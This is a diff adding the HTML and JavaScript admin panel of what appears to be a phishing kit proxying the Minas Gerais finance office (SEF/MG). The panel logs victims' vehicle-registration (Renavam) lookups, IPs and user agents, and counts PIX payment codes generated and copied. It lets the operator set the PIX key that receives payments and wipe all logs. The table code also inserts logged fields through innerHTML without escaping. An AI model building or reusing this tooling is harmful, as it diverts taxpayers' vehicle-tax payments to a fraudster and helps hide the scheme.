@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Administrativo - SEF/MG Proxy</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #f4f6f9; }
+        .sidebar {
+            min-height: 100vh;
+            background: linear-gradient(180deg, #0d6efd 0%, #0a58ca 100%);
+            color: white;
+        }
+        .sidebar .nav-link {
+            color: rgba(255,255,255,.8);
+            margin: 5px 0;
+        }
+        .sidebar .nav-link:hover, .sidebar .nav-link.active {
+            color: white;
+            background-color: rgba(255,255,255,.1);
+            border-radius: 5px;
+        }
+        .content { padding: 20px; }
+        .card-dashboard {
+            border-left: 4px solid #0d6efd;
+            box-shadow: 0 2px 6px rgba(0,0,0,.1);
+            transition: transform 0.2s;
+        }
+        .card-dashboard:hover { transform: translateY(-5px); }
+        .table-container {
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 2px 6px rgba(0,0,0,.1);
+        }
+        .logout-btn { cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-3 col-lg-2 px-0 sidebar">
+                <div class="p-3">
+                    <h4 class="text-center mb-4"><i class="fas fa-cogs me-2"></i>Admin</h4>
+                    <hr class="bg-white">
+                    <ul class="nav flex-column">
+                        <li class="nav-item">
+                            <a class="nav-link active" href="#" id="link-dashboard">
+                                <i class="fas fa-tachometer-alt me-2"></i>Dashboard
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" id="link-clicks">
+                                <i class="fas fa-mouse-pointer me-2"></i>Cliques
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" id="link-consultas">
+                                <i class="fas fa-search me-2"></i>Consultas
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" id="link-pix">
+                                <i class="fa-brands fa-pix me-2"></i>PIX Gerados
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" id="link-config">
+                                <i class="fas fa-gear me-2"></i>Configurações
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link text-danger" href="#" id="clear-logs">
+                                <i class="fas fa-trash-alt me-2"></i>Limpar Logs
+                            </a>
+                        </li>
+                        <li class="nav-item mt-4">
+                            <a class="nav-link logout-btn" id="logout">
+                                <i class="fas fa-sign-out-alt me-2"></i>Sair
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Conteúdo principal -->
+            <div class="col-md-9 col-lg-10 content">
+                <div id="dashboard-view" style="display: block;">
+                    <h2 class="mb-4"><i class="fas fa-tachometer-alt me-2"></i>Dashboard</h2>
+                    <div class="row">
+                        <div class="col-md-3 mb-3">
+                            <div class="card card-dashboard">
+                                <div class="card-body">
+                                    <h5 class="card-title text-muted">Total de Cliques</h5>
+                                    <h2 id="total-clicks">0</h2>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="card card-dashboard">
+                                <div class="card-body">
+                                    <h5 class="card-title text-muted">Total de Consultas</h5>
+                                    <h2 id="total-consultas">0</h2>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="card card-dashboard">
+                                <div class="card-body">
+                                    <h5 class="card-title text-muted">Valor Total Gerado (PIX)</h5>
+                                    <h2 id="valor-total-gerado">R$ 0,00</h2>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="card card-dashboard">
+                                <div class="card-body">
+                                    <h5 class="card-title text-muted">Valor Total Copiado (PIX)</h5>
+                                    <h2 id="valor-total-copiado">R$ 0,00</h2>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="card card-dashboard">
+                                <div class="card-body">
+                                    <h5 class="card-title text-muted">PIX Copiados (quantidade)</h5>
+                                    <h2 id="total-pix-copiados">0</h2>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="clicks-view" style="display: none;">
+                    <h2 class="mb-4"><i class="fas fa-mouse-pointer me-2"></i>Últimos Cliques</h2>
+                    <div class="table-container">
+                        <table class="table table-striped" id="clicks-table">
+                            <thead>
+                                <tr>
+                                    <th>Data/Hora</th>
+                                    <th>IP</th>
+                                    <th>User Agent</th>
+                                </tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div id="consultas-view" style="display: none;">
+                    <h2 class="mb-4"><i class="fas fa-search me-2"></i>Últimas Consultas</h2>
+                    <div class="table-container">
+                        <table class="table table-striped" id="consultas-table">
+                            <thead>
+                                <tr>
+                                    <th>Data/Hora</th>
+                                    <th>Renavam</th>
+                                    <th>Ano</th>
+                                    <th>Cidade</th>
+                                    <th>IP</th>
+                                    <th>User Agent</th>
+                                </tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div id="pix-view" style="display: none;">
+                    <h2 class="mb-4"><i class="fa-brands fa-pix me-2"></i>PIX Gerados</h2>
+                    <div class="table-container">
+                        <table class="table table-striped" id="pix-table">
+                            <thead>
+                                <tr>
+                                    <th>Data/Hora</th>
+                                    <th>Renavam</th>
+                                    <th>Valor</th>
+                                    <th>Copiado?</th>
+                                    <th>IP</th>
+                                </tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div id="config-view" style="display: none;">
+                    <h2 class="mb-4"><i class="fas fa-gear me-2"></i>Configurações da Chave PIX</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <form id="pix-form">
+                                <div class="mb-3">
+                                    <label for="nome" class="form-label">Nome do recebedor</label>
+                                    <input type="text" class="form-control" id="nome" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="cidade" class="form-label">Cidade</label>
+                                    <input type="text" class="form-control" id="cidade" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="identificador" class="form-label">Identificador (ex: CPF/CNPJ)</label>
+                                    <input type="text" class="form-control" id="identificador" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="chave" class="form-label">Chave PIX</label>
+                                    <input type="text" class="form-control" id="chave" required>
+                                </div>
+                                <button type="submit" class="btn btn-primary">Salvar</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de login -->
+    <div class="modal fade" id="loginModal" data-bs-backdrop="static" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Login Administrativo</h5>
+                </div>
+                <div class="modal-body">
+                    <form id="login-form">
+                        <div class="mb-3">
+                            <label for="username" class="form-label">Usuário</label>
+                            <input type="text" class="form-control" id="username" placeholder="Digite seu usuário">
+                        </div>
+                        <div class="mb-3">
+                            <label for="password" class="form-label">Senha</label>
+                            <input type="password" class="form-control" id="password" placeholder="Digite sua senha">
+                        </div>
+                        <button type="submit" class="btn btn-primary w-100">Entrar</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        let loginModal = new bootstrap.Modal(document.getElementById('loginModal'), { backdrop: 'static' });
+        let loggedIn = false;
+
+        function showView(viewId) {
+            document.querySelectorAll('.content > div').forEach(div => div.style.display = 'none');
+            document.getElementById(viewId).style.display = 'block';
+            document.querySelectorAll('.sidebar .nav-link').forEach(link => link.classList.remove('active'));
+            if (viewId === 'dashboard-view') document.getElementById('link-dashboard').classList.add('active');
+            else if (viewId === 'clicks-view') document.getElementById('link-clicks').classList.add('active');
+            else if (viewId === 'consultas-view') document.getElementById('link-consultas').classList.add('active');
+            else if (viewId === 'pix-view') document.getElementById('link-pix').classList.add('active');
+            else if (viewId === 'config-view') document.getElementById('link-config').classList.add('active');
+        }
+
+        async function checkAuth() {
+            try {
+                const res = await fetch('/api/admin/dashboard');
+                if (res.status === 401) {
+                    loginModal.show();
+                } else {
+                    loggedIn = true;
+                    loadDashboard();
+                }
+            } catch (e) {
+                loginModal.show();
+            }
+        }
+
+        document.getElementById('login-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const res = await fetch('/api/admin/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+            if (res.ok) {
+                loginModal.hide();
+                loggedIn = true;
+                loadDashboard();
+                showView('dashboard-view');
+            } else {
+                alert('Credenciais inválidas');
+            }
+        });
+
+        document.getElementById('logout').addEventListener('click', async () => {
+            await fetch('/api/admin/logout', { method: 'POST' });
+            loggedIn = false;
+            loginModal.show();
+        });
+
+        async function loadDashboard() {
+            const res = await fetch('/api/admin/dashboard');
+            const data = await res.json();
+            document.getElementById('total-clicks').innerText = data.totalClicks;
+            document.getElementById('total-consultas').innerText = data.totalConsultas;
+            document.getElementById('valor-total-gerado').innerText = 'R$ ' + data.valorTotalGerado.toFixed(2).replace('.', ',');
+            document.getElementById('valor-total-copiado').innerText = 'R$ ' + data.valorTotalCopiado.toFixed(2).replace('.', ',');
+            document.getElementById('total-pix-copiados').innerText = data.totalPixCopiados;
+        }
+
+        async function loadClicks() {
+            const res = await fetch('/api/admin/logs/clicks');
+            const data = await res.json();
+            const tbody = document.querySelector('#clicks-table tbody');
+            tbody.innerHTML = data.map(item => `
+                <tr>
+                    <td>${new Date(item.timestamp).toLocaleString('pt-BR')}</td>
+                    <td>${item.ip}</td>
+                    <td>${item.userAgent || ''}</td>
+                </tr>
+            `).join('');
+        }
+
+        async function loadConsultas() {
+            const res = await fetch('/api/admin/logs/consultas');
+            const data = await res.json();
+            const tbody = document.querySelector('#consultas-table tbody');
+            tbody.innerHTML = data.map(item => `
+                <tr>
+                    <td>${new Date(item.timestamp).toLocaleString('pt-BR')}</td>
+                    <td>${item.renavam}</td>
+                    <td>${item.ano}</td>
+                    <td>${item.cidade || ''}</td>
+                    <td>${item.ip}</td>
+                    <td>${item.userAgent || ''}</td>
+                </tr>
+            `).join('');
+        }
+
+        async function loadPix() {
+            const res = await fetch('/api/admin/logs/pix');
+            const data = await res.json();
+            const tbody = document.querySelector('#pix-table tbody');
+            tbody.innerHTML = data.map(item => `
+                <tr>
+                    <td>${new Date(item.timestamp).toLocaleString('pt-BR')}</td>
+                    <td>${item.renavam}</td>
+                    <td>R$ ${parseFloat(item.valor).toFixed(2).replace('.', ',')}</td>
+                    <td>${item.copiado ? '<span class="badge bg-success">Sim</span>' : '<span class="badge bg-secondary">Não</span>'}</td>
+                    <td>${item.ip}</td>
+                </tr>
+            `).join('');
+        }
+
+        async function loadConfig() {
+            const res = await fetch('/api/admin/config/pix');
+            const data = await res.json();
+            document.getElementById('nome').value = data.nome || '';
+            document.getElementById('cidade').value = data.cidade || '';
+            document.getElementById('identificador').value = data.identificador || '';
+            document.getElementById('chave').value = data.chave || '';
+        }
+
+        document.getElementById('pix-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const dados = {
+                nome: document.getElementById('nome').value,
+                cidade: document.getElementById('cidade').value,
+                identificador: document.getElementById('identificador').value,
+                chave: document.getElementById('chave').value
+            };
+            const res = await fetch('/api/admin/config/pix', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(dados)
+            });
+            if (res.ok) {
+                alert('Configurações salvas com sucesso!');
+            } else {
+                alert('Erro ao salvar');
+            }
+        });
+
+        document.getElementById('clear-logs').addEventListener('click', async (e) => {
+            e.preventDefault();
+            if (confirm('Tem certeza que deseja apagar todos os logs? Essa ação não pode ser desfeita.')) {
+                const res = await fetch('/api/admin/clear-logs', { method: 'POST' });
+                if (res.ok) {
+                    alert('Logs apagados com sucesso!');
+                    loadDashboard();
+                    if (document.getElementById('clicks-view').style.display !== 'none') loadClicks();
+                    if (document.getElementById('consultas-view').style.display !== 'none') loadConsultas();
+                    if (document.getElementById('pix-view').style.display !== 'none') loadPix();
+                }
+            }
+        });
+
+        document.getElementById('link-dashboard').addEventListener('click', (e) => {
+            e.preventDefault();
+            showView('dashboard-view');
+            loadDashboard();
+        });
+        document.getElementById('link-clicks').addEventListener('click', (e) => {
+            e.preventDefault();
+            showView('clicks-view');
+            loadClicks();
+        });
+        document.getElementById('link-consultas').addEventListener('click', (e) => {
+            e.preventDefault();
+            showView('consultas-view');
+            loadConsultas();
+        });
+        document.getElementById('link-pix').addEventListener('click', (e) => {
+            e.preventDefault();
+            showView('pix-view');
+            loadPix();
+        });
+        document.getElementById('link-config').addEventListener('click', (e) => {
+            e.preventDefault();
+            showView('config-view');
+            loadConfig();
+        });
+
+        checkAuth();
+    </script>
+</body>
+</html>
